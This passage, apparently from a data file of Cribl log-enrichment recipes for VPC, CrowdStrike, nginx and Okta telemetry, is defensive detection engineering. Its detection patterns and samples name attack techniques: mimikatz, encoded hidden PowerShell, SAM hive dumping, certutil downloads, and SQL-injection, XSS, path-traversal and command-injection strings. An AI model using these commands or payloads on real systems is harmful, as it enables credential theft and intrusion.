        personas: ['Cloud Security', 'Incident Response', 'Platform Engineering'],
        implementation: {
          example: '// Cribl Search cross-dataset join:\n// dataset="vpc_flow_logs" action="ACCEPT" dstport==5432 earliest=-1h\n// | join kind=left (\n//     dataset="aws_sg_rules"\n//     | where protocol=="tcp" and port==5432\n//   ) on security_groups=sg_id\n// | extend matched_rule = strcat(sg_name, " / ", rule_description)\n// | summarize Flows=count() by srcaddr, dstaddr, matched_rule',
          notes: 'Requires AWS security group rules exported as a dataset (via aws ec2 describe-security-groups). Enables "which rule allowed this traffic?" answers during investigation.'
        }
      },
      {
        name: 'Instance Metadata Join',
        description: 'Join source/destination IPs with EC2 instance metadata: instance type, launch time, IAM role, auto-scaling group.',
        criblFunction: 'Search-time lookup',
        addedFields: ['instance_id', 'instance_type', 'iam_role', 'asg_name', 'launch_time'],
        securityValue: 'Provides full instance context during investigation. "Newly launched instance communicating with known C2" combines flow + instance age for high-confidence detection.',
        observabilityValue: 'Enables instance-type traffic analysis, identifies over-provisioned instances by network utilization, supports right-sizing recommendations.',
        personas: ['Cloud Security', 'SRE', 'Platform Engineering', 'Incident Response'],
        implementation: {
          example: '// Cribl Search lookup at query time:\n// dataset="vpc_flow_logs" earliest=-1h\n// | lookup ec2_instances.csv on srcaddr=private_ip output instance_id, instance_type, iam_role, asg_name\n// | where isnotnull(instance_id)\n// | summarize TotalFlows=count(), TotalBytes=sum(bytes) by instance_id, instance_type, iam_role',
          notes: 'Populate ec2_instances.csv via scheduled job running: aws ec2 describe-instances across all regions/accounts. Include launch_time for "newly launched instance" detection.'
        }
      }
    ]
  },
  'crowdstrike-edr': {
    streamTime: [
      {
        name: 'Process Reputation Scoring',
        description: 'Enrich ImageFileName and SHA256HashData against known-good (Microsoft catalog, signed software) and known-bad (threat intel) databases.',
        criblFunction: 'Lookup',
        addedFields: ['process_reputation', 'is_signed', 'signer_name', 'reputation_source'],
        securityValue: 'Immediately distinguishes legitimate system binaries from unknown/malicious processes. "Unsigned process spawned by explorer.exe" is a stronger signal than raw filename alone.',
        observabilityValue: 'Supports software inventory accuracy — track unsigned or unknown processes across the fleet as an endpoint hygiene metric.',
        personas: ['SOC', 'Threat Hunting', 'Endpoint Team', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'software_reputation.csv',
            inputField: 'SHA256HashData → sha256',
            outputFields: ['process_reputation', 'is_signed', 'signer_name', 'reputation_source'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'sha256,reputation,is_signed,signer_name,source\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,known-good,true,Microsoft Corporation,Microsoft-Catalog\na1b2c3d4e5f6...,known-good,true,Google LLC,Signed-Software-DB\ndeadbeef1234...,known-bad,false,,VirusTotal-Malware',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: software_reputation.csv\n// Input: SHA256HashData → sha256 (exact match)\n// Output: reputation → process_reputation, is_signed, signer_name, source → reputation_source\n//\n// Add Eval for unmatched: process_reputation = process_reputation || \'unknown\'\n//\n// Result: { SHA256HashData: "e3b0c44...", process_reputation: "known-good", is_signed: "true", signer_name: "Microsoft Corporation" }',
          notes: 'Seed from NSRL (National Software Reference Library) + your software inventory. Incrementally add hashes from CrowdStrike Intelligence API. Unknown = needs investigation.'
        }
      },
      {
        name: 'Asset Criticality Enrichment',
        description: 'Lookup ComputerName against CMDB to add asset criticality tier, business unit, environment, and primary user.',
        criblFunction: 'Lookup',
        addedFields: ['asset_criticality', 'business_unit', 'environment', 'primary_user', 'asset_type'],
        securityValue: 'Enables severity escalation for critical assets — "credential dumping on Tier-1 domain controller" vs "same activity on developer laptop" receive different response priority.',
        observabilityValue: 'Supports fleet health reporting by business unit and criticality tier. Identify coverage gaps in specific segments.',
        personas: ['SOC', 'Incident Response', 'IT Operations', 'Endpoint Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'asset_inventory.csv',
            inputField: 'ComputerName → hostname',
            outputFields: ['asset_criticality', 'business_unit', 'environment', 'primary_user', 'asset_type'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'hostname,criticality,business_unit,environment,primary_user,asset_type\nDC01,Tier-1,IT,production,,domain-controller\nWKSTN-JSMITH,Tier-3,Engineering,corporate,jsmith,workstation\nSQL-PROD-01,Tier-1,Commerce,production,,database-server\nJUMP-01,Tier-2,Security,production,,bastion-host',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: asset_inventory.csv\n// Input: ComputerName → hostname (case-insensitive match)\n// Output: criticality → asset_criticality, business_unit, environment, primary_user, asset_type\n//\n// Result: { ComputerName: "DC01", asset_criticality: "Tier-1", business_unit: "IT", asset_type: "domain-controller" }',
          notes: 'Same asset_inventory.csv used across multiple sources (Palo Alto, CrowdStrike, etc.). Single source of truth from CMDB. Hostname matching may need normalization (strip FQDN suffix).'
        }
      },
      {
        name: 'MITRE ATT&CK Technique Mapping',
        description: 'Map ProcessRollup2 command-line patterns and parent-child relationships to MITRE ATT&CK technique IDs at pipeline level.',
        criblFunction: 'Regex + Lookup',
        addedFields: ['mitre_technique_id', 'mitre_technique_name', 'mitre_tactic'],
        securityValue: 'Pre-tags EDR telemetry with ATT&CK context before reaching SIEM. Enables technique-based correlation and attack chain visualization without downstream regex parsing.',
        observabilityValue: 'Enables "ATT&CK technique coverage" dashboards showing which techniques are observed in the environment and detection gaps.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Regex + Lookup',
            lookupFile: 'mitre_cmdline_patterns.csv',
            inputField: 'CommandLine (regex match)',
            outputFields: ['mitre_technique_id', 'mitre_technique_name', 'mitre_tactic'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'pattern,technique_id,technique_name,tactic\n.*mimikatz.*,T1003.001,LSASS Memory,Credential Access\n.*-nop.*-w hidden.*-enc.*,T1059.001,PowerShell,Execution\n.*reg.*save.*SAM.*,T1003.002,Security Account Manager,Credential Access\n.*certutil.*-urlcache.*,T1105,Ingress Tool Transfer,Command and Control\n.*whoami.*/priv.*,T1033,System Owner Discovery,Discovery',
          example: '// Cribl Stream → Processing Pipeline:\n// Step 1: Regex Extract function (check CommandLine against patterns)\n// Step 2: Lookup function to get MITRE details\n//\n// Or combined Eval:\n// mitre_technique_id = CommandLine.match(/mimikatz/i) ? \'T1003.001\'\n//   : CommandLine.match(/-nop.*-w hidden.*-enc/) ? \'T1059.001\'\n//   : CommandLine.match(/certutil.*-urlcache/) ? \'T1105\' : \'\'\n//\n// Result: { CommandLine: "powershell -nop -w hidden -enc SGVsbG8=", mitre_technique_id: "T1059.001", mitre_tactic: "Execution" }',
          notes: 'Start with Sigma rules converted to regex patterns. Expand coverage over time. Not exhaustive — complements CrowdStrike native detections.'
        }
      },
      {
        name: 'User Risk Score Injection',
        description: 'Enrich UserName with current risk score from identity platform (Okta risk, UEBA score) to provide user-level context at the endpoint layer.',
        criblFunction: 'Lookup',
        addedFields: ['user_risk_score', 'user_risk_level', 'user_risk_factors'],
        securityValue: 'Correlates endpoint behavior with identity risk — "high-risk user executing PowerShell download cradle" combines two signals that individually might not alert.',
        observabilityValue: 'Supports user experience monitoring — high-risk users may need additional security controls that impact performance.',
        personas: ['SOC', 'Security Engineering', 'Threat Hunting', 'Identity Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_risk_scores.csv',
            inputField: 'UserName → username',
            outputFields: ['user_risk_score', 'user_risk_level', 'user_risk_factors'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'username,risk_score,risk_level,risk_factors\njsmith,25,low,none\nadmin-bob,75,high,privileged;new-device-login\ncontractor-jane,60,medium,contractor;vpn-anomaly',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_risk_scores.csv (pulled from Okta/UEBA system)\n// Input: UserName → username (case-insensitive)\n// Output: risk_score → user_risk_score, risk_level → user_risk_level, risk_factors → user_risk_factors\n//\n// Result: { UserName: "admin-bob", user_risk_score: 75, user_risk_level: "high", user_risk_factors: "privileged;new-device-login" }',
          notes: 'Pull risk scores from your identity platform (Okta, Azure AD Identity Protection) via API every 15 minutes. Scores are ephemeral — they change frequently.'
        }
      },
      {
        name: 'Network Segment Classification',
        description: 'Map the endpoint IP address to network segment (corporate, VPN, guest, cloud) based on DHCP scope or subnet membership.',
        criblFunction: 'Lookup',
        addedFields: ['network_segment', 'network_trust_level', 'is_vpn'],
        securityValue: 'Enables location-aware detection — "LOLBin execution from guest network" is higher priority than same activity on corporate LAN. VPN context important for remote worker monitoring.',
        observabilityValue: 'Supports endpoint connectivity dashboards — track agent check-in rates by network segment, identify offline segments.',
        personas: ['SOC', 'NOC', 'Security Engineering', 'IT Operations'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'network_segments.csv',
            inputField: 'LocalAddressIP4 → cidr (CIDR match)',
            outputFields: ['network_segment', 'network_trust_level', 'is_vpn'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'cidr,segment,trust_level,is_vpn\n10.1.0.0/16,corporate-lan,high,false\n10.2.0.0/16,server-dmz,high,false\n10.100.0.0/16,vpn-pool,medium,true\n192.168.0.0/16,guest-wifi,low,false',
          example: '// Cribl Stream → Processing → Lookup Function (CIDR match mode)\n// Lookup File: network_segments.csv\n// Input: LocalAddressIP4 → cidr (CIDR match)\n// Output: segment → network_segment, trust_level → network_trust_level, is_vpn\n//\n// Result: { LocalAddressIP4: "10.100.5.42", network_segment: "vpn-pool", network_trust_level: "medium", is_vpn: "true" }',
          notes: 'Reuse the same CIDR lookup file used for firewall Internal/External classification. Extend with VPN and guest network ranges.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Process Tree Reconstruction',
        description: 'At investigation time, join process events by ParentProcessId chain to reconstruct the full process ancestry tree.',
        criblFunction: 'Search-time self-join',
        addedFields: ['process_tree_depth', 'root_process', 'full_ancestry'],
        securityValue: 'Enables attack chain visualization during investigation. See the full execution path from initial access (email attachment) through privilege escalation to objective without manual event correlation.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC'],
        implementation: {
          example: '// Cribl Search self-join for process tree:\n// dataset="edr_process_events" ComputerName="DC01" earliest=-4h\n// | where ParentProcessId != ""\n// | extend ProcessChain = strcat(ParentBaseFileName, " → ", FileName)\n// | summarize count(), Commands=makeset(CommandLine) by ProcessChain, UserName\n// | order by count_ desc\n//\n// For full tree depth:\n// dataset="edr_process_events" TargetProcessId=="$PID" earliest=-1h\n// | join kind=inner (dataset="edr_process_events" earliest=-1h) on TargetProcessId=ParentProcessId\n// | extend tree = strcat(ParentBaseFileName, " → ", FileName, " → ", FileName1)',
          notes: 'Process tree reconstruction requires joining parent→child relationships iteratively. For deep trees (4+ levels), use multiple sequential joins or a recursive search pattern.'
        }
      },
      {
        name: 'File Hash Intelligence',
        description: 'Join SHA256HashData against cached threat intelligence results for multi-engine detection scores and malware family classification.',
        criblFunction: 'Search-time lookup',
        addedFields: ['hash_verdict', 'malware_family', 'first_seen_date', 'detection_engines'],
        securityValue: 'Provides deep file reputation context during investigation without paying for API calls on every process execution event at ingest time.',
        personas: ['Incident Response', 'Threat Hunting', 'SOC', 'Endpoint Team'],
        implementation: {
          example: '// Cribl Search lookup at query time:\n// dataset="edr_process_events" earliest=-24h\n// | where SHA256HashData != ""\n// | lookup vt_hash_results.csv on SHA256HashData=sha256 output verdict as hash_verdict, family as malware_family, engines as detection_engines\n// | where hash_verdict == "malicious"\n// | summarize Hits=count() by SHA256HashData, FileName, malware_family, detection_engines',
          notes: 'Cache VirusTotal results for hashes seen in environment. Populate via scheduled job that submits new hashes to VT API. Results are stable — hash reputation rarely changes.'
        }
      }
    ]
  },
  'nginx-access': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to remote_addr and http_x_forwarded_for (true client IP) for traffic origin analysis.',
        criblFunction: 'GeoIP',
        addedFields: ['client_country', 'client_city', 'client_asn', 'client_org'],
        securityValue: 'Identifies attack traffic origin, enables geographic blocking rules, supports impossible travel detection for authenticated web applications.',
        observabilityValue: 'Enables geographic traffic dashboards, identifies which regions drive the most load, supports CDN placement decisions.',
        personas: ['Security Engineering', 'SOC', 'SRE', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'remote_addr (or http_x_forwarded_for if behind CDN)',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input: true_client_ip (use http_x_forwarded_for if present, else remote_addr)\n// Pre-Eval: true_client_ip = http_x_forwarded_for ? http_x_forwarded_for.split(\',\')[0].trim() : remote_addr\n//\n// GeoIP Input: true_client_ip\n// Output: client_country, client_city, client_asn, client_org\n//\n// Result: { remote_addr: "10.0.0.1", http_x_forwarded_for: "198.51.100.42", client_country: "US", client_asn: "AS13335" }',
          notes: 'When behind a CDN/load balancer, always use the first IP in X-Forwarded-For, not remote_addr (which will be the CDN IP).'
        }
      },
      {
        name: 'User Agent Classification',
        description: 'Parse and classify http_user_agent into categories: browser (with version), mobile, bot/crawler, scanner, API client, or unknown.',
        criblFunction: 'Regex + Lookup',
        addedFields: ['ua_category', 'ua_browser', 'ua_os', 'ua_is_bot', 'ua_is_scanner'],
        securityValue: 'Immediately identifies known vulnerability scanners, malicious bots, and spoofed user agents. Enables scanner-aware detection without downstream regex.',
        observabilityValue: 'Enables traffic breakdown by client type — what percentage is bot vs human? Which browsers need support? What API clients are active?',
        personas: ['Security Engineering', 'SOC', 'SRE', 'Application Team'],
        implementation: {
          functionConfig: {
            function: 'Regex + Lookup',
            lookupFile: 'ua_classifications.csv',
            inputField: 'http_user_agent (regex match)',
            outputFields: ['ua_category', 'ua_browser', 'ua_os', 'ua_is_bot', 'ua_is_scanner'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'pattern,category,browser,os,is_bot,is_scanner\n.*Googlebot.*,bot,Googlebot,Linux,true,false\n.*Nmap.*,scanner,,Linux,true,true\n.*sqlmap.*,scanner,,Linux,true,true\n.*Chrome/\\d+.*,browser,Chrome,varies,false,false\n.*curl/.*,api-client,curl,,true,false',
          example: '// Cribl Stream → Processing → Regex Extract + Eval\n// Step 1: Regex Extract on http_user_agent for known patterns\n// Step 2: Eval for classification:\n//   ua_is_bot = /bot|crawler|spider|Googlebot|Bingbot/i.test(http_user_agent) ? \'true\' : \'false\'\n//   ua_is_scanner = /sqlmap|nmap|nikto|masscan|nuclei|dirbuster/i.test(http_user_agent) ? \'true\' : \'false\'\n//   ua_category = ua_is_scanner==\'true\' ? \'scanner\' : ua_is_bot==\'true\' ? \'bot\' : \'browser\'\n//\n// Result: { http_user_agent: "sqlmap/1.7", ua_category: "scanner", ua_is_bot: "true", ua_is_scanner: "true" }',
          notes: 'Start with known scanner/bot signatures and refine over time. Unknown user agents default to "browser" — investigate high-volume unknowns periodically.'
        }
      },
      {
        name: 'Request URI Attack Pattern Detection',
        description: 'Apply regex patterns to request_uri to detect SQL injection, XSS, path traversal, command injection, and other OWASP Top 10 attacks.',
        criblFunction: 'Regex (Eval)',
        addedFields: ['attack_type', 'attack_confidence', 'attack_payload_snippet'],
        securityValue: 'Tags attack attempts at the pipeline level before reaching SIEM. Enables immediate alerting on web attacks without requiring complex SIEM regex rules.',
        observabilityValue: 'Supports "attack attempts per minute" dashboards and trending for application security posture monitoring.',
        personas: ['Security Engineering', 'SOC', 'Application Team'],
        implementation: {
          functionConfig: {
            function: 'Eval (Regex)',
            expression: 'Multiple regex checks against request_uri',
            outputFields: ['attack_type', 'attack_confidence', 'attack_payload_snippet']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Expressions:\n// attack_type = request_uri.match(/(\'|--|;|UNION\\s+SELECT|OR\\s+1=1)/i) ? \'sql-injection\'\n//   : request_uri.match(/(<script|javascript:|on\\w+=)/i) ? \'xss\'\n//   : request_uri.match(/(\\.\\.[\\/\\\\]|etc\\/passwd|etc\\/shadow)/i) ? \'path-traversal\'\n//   : request_uri.match(/(;|\\||\\$\\(|\\x60)/i) ? \'command-injection\' : \'\'\n//\n// attack_confidence = attack_type != \'\' ? \'high\' : \'\'\n// attack_payload_snippet = attack_type != \'\' ? request_uri.substring(0, 200) : \'\'\n//\n// Result: { request_uri: "/api/users?id=1\' OR 1=1--", attack_type: "sql-injection", attack_confidence: "high" }',
          notes: 'These regex patterns catch obvious attacks. Not a replacement for a WAF — designed to tag events for SIEM correlation. Tune to reduce false positives on legitimate URIs containing SQL keywords.'
        }
      },
      {
        name: 'Upstream Service Mapping',
        description: 'Map upstream_addr (backend server IP:port) to service name, team owner, and deployment environment using a lookup table.',
        criblFunction: 'Lookup',
        addedFields: ['upstream_service', 'service_team', 'service_environment'],
        securityValue: 'Enables service-aware web attack detection — attacks targeting authentication services are higher priority than attacks on static content servers.',
        observabilityValue: 'Enables per-service latency dashboards, error rate by team ownership, and service-level SLO tracking without application instrumentation.',
        personas: ['SRE', 'Platform Engineering', 'Application Team', 'NOC'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'upstream_services.csv',
            inputField: 'upstream_addr → backend_addr',
            outputFields: ['upstream_service', 'service_team', 'service_environment'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'backend_addr,service_name,team,environment\n10.10.1.5:8080,user-api,platform-team,production\n10.10.1.6:8080,payment-api,commerce-team,production\n10.10.2.10:3000,admin-dashboard,internal-tools,production\n10.10.3.5:8080,user-api,platform-team,staging',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: upstream_services.csv\n// Input: upstream_addr → backend_addr (exact match including port)\n// Output: service_name → upstream_service, team → service_team, environment → service_environment\n//\n// Result: { upstream_addr: "10.10.1.5:8080", upstream_service: "user-api", service_team: "platform-team" }',
          notes: 'Generate from your service registry (Consul, Kubernetes services, nginx upstream configs). Include port in the match for multi-service hosts.'
        }
      },
      {
        name: 'Rate Limiting Context',
        description: 'Track request counts per client IP per minute using a stateful Cribl pipeline. Tag clients exceeding thresholds.',
        criblFunction: 'Eval (Stateful)',
        addedFields: ['client_rpm', 'rate_limit_exceeded', 'client_burst_score'],
        securityValue: 'Identifies brute force and credential stuffing at the pipeline level. Rate context travels with each event to SIEM for immediate alert generation.',
        observabilityValue: 'Identifies abusive clients impacting service performance. Supports capacity planning by quantifying per-client request rates.',
        personas: ['Security Engineering', 'SRE', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval (Stateful)',
            expression: 'Requires Cribl Stream stateful function or Redis lookup',
            outputFields: ['client_rpm', 'rate_limit_exceeded', 'client_burst_score']
          },
          example: '// Cribl Stream → Processing → Redis/Stateful Lookup\n// This requires a stateful approach — two options:\n//\n// Option A: Redis Lookup (recommended for accuracy)\n//   INCR key="rpm:{remote_addr}" with 60s TTL\n//   client_rpm = Redis GET "rpm:{remote_addr}"\n//   rate_limit_exceeded = client_rpm > 600 ? \'true\' : \'false\'\n//\n// Option B: Cribl Aggregations function\n//   Group by: remote_addr\n//   Time window: 60 seconds\n//   Metric: count() → client_rpm\n//   Emit as field on each event\n//\n// Result: { remote_addr: "198.51.100.42", client_rpm: 1250, rate_limit_exceeded: "true" }',
          notes: 'Stateful enrichment requires external state (Redis) or Cribl Stream aggregations. For simpler deployments, tag clients exceeding thresholds observed in a sliding window.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Session Reconstruction',
        description: 'Group requests by client IP + user agent within time windows to reconstruct browsing sessions and attack campaigns.',
        criblFunction: 'Search-time aggregation',
        addedFields: ['session_id', 'session_request_count', 'session_duration_sec', 'session_pages_visited'],
        securityValue: 'Enables attack campaign timeline reconstruction — see the full sequence of an attacker probing, exploiting, and extracting data in a single session view.',
        observabilityValue: 'Supports user journey analysis, identifies drop-off points, measures session depth for UX optimization.',
        personas: ['Incident Response', 'Application Team', 'SOC'],
        implementation: {
          example: '// Cribl Search session grouping:\n// dataset="nginx_access" remote_addr="198.51.100.42" earliest=-1h\n// | order by timestamp asc\n// | summarize session_request_count=count(), session_duration_sec=datetime_diff(\'second\', max(timestamp), min(timestamp)),\n//     pages_visited=dcount(request_uri), first_request=min(request_uri), last_request=max(request_uri)\n//   by remote_addr, http_user_agent\n// | extend session_type = iif(session_request_count > 100, "automated", "human")',
          notes: 'Session boundaries are inferred from time gaps between requests (>30 minutes = new session). For authenticated apps, use session cookies instead of IP+UA.'
        }
      },
      {
        name: 'Error Correlation with Deployments',
        description: 'Join error spike events with deployment timestamps from CI/CD to identify which deployment introduced the errors.',
        criblFunction: 'Search-time dataset join',
        addedFields: ['deployment_id', 'deployment_time', 'deployer', 'deployment_change_set'],
        securityValue: 'Helps distinguish between attack-induced errors and deployment-induced errors during triage.',
        observabilityValue: 'Directly correlates error spikes to specific deployments — "errors started 3 minutes after deployment X by user Y" dramatically speeds up MTTR.',
        personas: ['SRE', 'Platform Engineering', 'Application Team', 'NOC'],
        implementation: {
          example: '// Cribl Search cross-dataset join:\n// dataset="nginx_access" status >= 500 earliest=-2h\n// | timestats span=5m ErrorCount=count() by upstream_service\n// | join kind=left (\n//     dataset="deployment_events" earliest=-2h\n//     | project deploy_time=timestamp, service=service_name, deployer, commit_id\n//   ) on upstream_service=service\n// | where deploy_time between (bin(timestamp, 5m) - 15m) and bin(timestamp, 5m)\n// | extend errors_after_deploy = ErrorCount',
          notes: 'Requires deployment events stored in Cribl Lake (from CI/CD webhooks). The time correlation window (±15 minutes) identifies which deploy caused the error spike.'
        }
      }
    ]
  },
  'okta-system-logs': {
    streamTime: [
      {
        name: 'Threat Intelligence IP Lookup',
        description: 'Enrich client.ipAddress against threat intelligence feeds to identify logins from known malicious infrastructure (VPNs, bulletproof hosting, Tor exit nodes).',
        criblFunction: 'Lookup',
        addedFields: ['ip_threat_score', 'ip_threat_category', 'is_tor_exit', 'is_known_vpn'],
        securityValue: 'Flags authentication attempts from suspicious infrastructure before reaching SIEM. "Successful login from known Tor exit node" is immediately high-priority regardless of other signals.',
        observabilityValue: 'Supports "logins from flagged IPs" metrics for security posture dashboards.',
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Identity Team'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'threat_intel_iocs.csv',
            inputField: 'client.ipAddress → indicator',
            outputFields: ['ip_threat_score', 'ip_threat_category', 'is_tor_exit', 'is_known_vpn'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'indicator,threat_score,category,is_tor,is_vpn\n185.220.101.1,90,tor-exit,true,false\n198.51.100.50,70,residential-proxy,false,true\n104.244.77.100,85,vpn-infrastructure,false,true',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: threat_intel_iocs.csv (includes Tor exits + VPN lists)\n// Input: client.ipAddress → indicator (exact match)\n// Output: threat_score → ip_threat_score, category → ip_threat_category, is_tor → is_tor_exit, is_vpn → is_known_vpn\n//\n// Result: { "client.ipAddress": "185.220.101.1", ip_threat_score: 90, is_tor_exit: "true" }',
          notes: 'Include Tor exit node list (updated hourly from torproject.org), commercial VPN exit lists, and residential proxy databases. High overlap with credential stuffing infrastructure.'
        }
      },
      {
        name: 'User Directory Enrichment',
        description: 'Lookup actor.alternateId against HR/directory system to add department, manager, hire date, employment status, and VIP flag.',
        criblFunction: 'Lookup',
        addedFields: ['user_department', 'user_manager', 'user_hire_date', 'user_vip', 'user_employment_status'],
        securityValue: 'Enables context-aware detection: VIP accounts get heightened monitoring, newly-hired users with admin actions are suspicious, terminated users still authenticating is critical.',
        observabilityValue: 'Enables department-level auth metrics, onboarding/offboarding tracking, and VIP experience monitoring.',
        personas: ['SOC', 'Identity Team', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'hr_directory.csv',
            inputField: 'actor.alternateId → email',
            outputFields: ['user_department', 'user_manager', 'user_hire_date', 'user_vip', 'user_employment_status'],
            reloadInterval: '6 hours'
          },
          lookupSample: 'email,department,manager,hire_date,vip,employment_status\njsmith@company.com,Engineering,Jane Doe,2024-03-15,false,active\nceo@company.com,Executive,Board,2020-01-01,true,active\ncontractor@company.com,Consulting,,2026-05-01,false,contractor',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: hr_directory.csv (from Workday/BambooHR API export)\n// Input: actor.alternateId → email (exact match)\n// Output: department → user_department, manager → user_manager, hire_date → user_hire_date, vip → user_vip, employment_status → user_employment_status\n//\n// Result: { "actor.alternateId": "jsmith@company.com", user_department: "Engineering", user_vip: "false" }',
          notes: 'Pull from HR system (Workday, BambooHR) via API. Key field is employment_status — "terminated" users still authenticating is an immediate critical alert.'
        }
      },
      {
        name: 'Application Risk Classification',
        description: 'Enrich target application (target[].displayName) with risk tier, data sensitivity level, and compliance scope (SOX, HIPAA, PCI).',
        criblFunction: 'Lookup',
        addedFields: ['app_risk_tier', 'app_data_sensitivity', 'app_compliance_scope', 'app_sanctioned'],
        securityValue: 'Enables prioritized alerting — failed MFA to a PCI-scoped application is higher priority than same event for a low-risk internal tool. Supports compliance reporting.',
        observabilityValue: 'Enables application-tier-based SLO tracking, compliance scope access reporting, and sanctioned vs unsanctioned usage analysis.',
        personas: ['SOC', 'Compliance', 'Identity Team', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'app_risk_classification.csv',
            inputField: 'target.displayName → app_name',
            outputFields: ['app_risk_tier', 'app_data_sensitivity', 'app_compliance_scope', 'app_sanctioned'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'app_name,risk_tier,data_sensitivity,compliance_scope,sanctioned\nSalesforce,high,confidential,SOX,true\nSlack,medium,internal,none,true\nAWS Console,critical,restricted,SOX;PCI,true\nShadow-App,high,unknown,none,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Input: target[0].displayName → app_name (first target in array)\n// Output: risk_tier → app_risk_tier, data_sensitivity → app_data_sensitivity, compliance_scope → app_compliance_scope\n//\n// Result: { "target.displayName": "AWS Console", app_risk_tier: "critical", app_compliance_scope: "SOX;PCI" }',
          notes: 'Maintain application inventory with compliance scope tags. Critical for: "failed MFA to PCI-scoped application" detection prioritization.'
        }
      },
      {
        name: 'Behavioral Baseline Deviation',
        description: 'Compare current login attributes (location, device, time-of-day) against user\'s historical baseline. Flag deviations.',
        criblFunction: 'Lookup (pre-computed baselines)',
        addedFields: ['login_location_anomaly', 'login_time_anomaly', 'login_device_anomaly', 'deviation_score'],
        securityValue: 'Augments Okta\'s native behavior signals with custom baselines. Catches anomalies that Okta\'s built-in risk engine misses (e.g., unusual time-of-day for specific user).',
        observabilityValue: 'Tracks "authentication anomaly rate" as a fleet-level security posture metric. Spikes indicate broad credential compromise or policy changes.',
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Threat Hunting'],
        implementation: {
          functionConfig: {
            function: 'Lookup (pre-computed baselines)',
            lookupFile: 'user_baselines.csv',
            inputField: 'actor.alternateId → user',
            outputFields: ['login_location_anomaly', 'login_time_anomaly', 'login_device_anomaly', 'deviation_score'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'user,typical_countries,typical_hours,typical_devices,avg_daily_logins\njsmith@company.com,US,8-18,Chrome/Mac;Okta-Mobile/iOS,5\nadmin-bob@company.com,US;CA,6-22,Firefox/Linux,12',
          example: '// Cribl Stream → Processing Pipeline:\n// Step 1: Lookup user baseline (user_baselines.csv)\n// Step 2: Eval to compare current event against baseline:\n//   login_location_anomaly = !typical_countries.includes(client.geographicalContext.country) ? \'true\' : \'false\'\n//   login_time_anomaly = (new Date(published).getHours() < typical_hours_start || new Date(published).getHours() > typical_hours_end) ? \'true\' : \'false\'\n//   deviation_score = (login_location_anomaly==\'true\' ? 40 : 0) + (login_time_anomaly==\'true\' ? 30 : 0) + (login_device_anomaly==\'true\' ? 30 : 0)\n//\n// Result: { deviation_score: 70, login_location_anomaly: "true", login_time_anomaly: "true" }',
          notes: 'Compute baselines via daily scheduled job: aggregate last 30 days of Okta logins per user → typical countries, hours, devices. Store as CSV for fast pipeline lookup.'
        }
      },
      {
        name: 'Geographic Distance Calculation',
        description: 'Calculate distance between client.geographicalContext coordinates and user\'s baseline location. Pre-compute impossible travel signal.',
        criblFunction: 'Eval (Haversine formula)',
        addedFields: ['distance_from_baseline_km', 'travel_speed_kmh', 'impossible_travel_flag'],
        securityValue: 'Pre-computes impossible travel at the pipeline rather than requiring SIEM to perform stateful geo correlation. Dramatically simplifies downstream detection rules.',
        observabilityValue: 'Supports "average login distance" metrics for workforce mobility analysis and remote work program monitoring.',
        personas: ['SOC', 'Security Engineering', 'Identity Team'],
        implementation: {
          functionConfig: {
            function: 'Eval (Haversine formula)',
            expression: 'Calculate distance from user baseline location',
            outputFields: ['distance_from_baseline_km', 'travel_speed_kmh', 'impossible_travel_flag']
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Requires: user_baselines.csv with baseline_lat, baseline_lon fields\n//\n// Haversine distance calculation:\n// const R = 6371; // Earth radius in km\n// const dLat = (lat - baseline_lat) * Math.PI / 180;\n// const dLon = (lon - baseline_lon) * Math.PI / 180;\n// const a = Math.sin(dLat/2)**2 + Math.cos(baseline_lat*Math.PI/180) * Math.cos(lat*Math.PI/180) * Math.sin(dLon/2)**2;\n// distance_from_baseline_km = Math.round(R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a)));\n//\n// travel_speed_kmh = distance_from_baseline_km / (hours_since_last_login || 1)\n// impossible_travel_flag = travel_speed_kmh > 900 ? \'true\' : \'false\'  // >900 km/h = faster than commercial flight\n//\n// Result: { distance_from_baseline_km: 8500, travel_speed_kmh: 4250, impossible_travel_flag: "true" }',
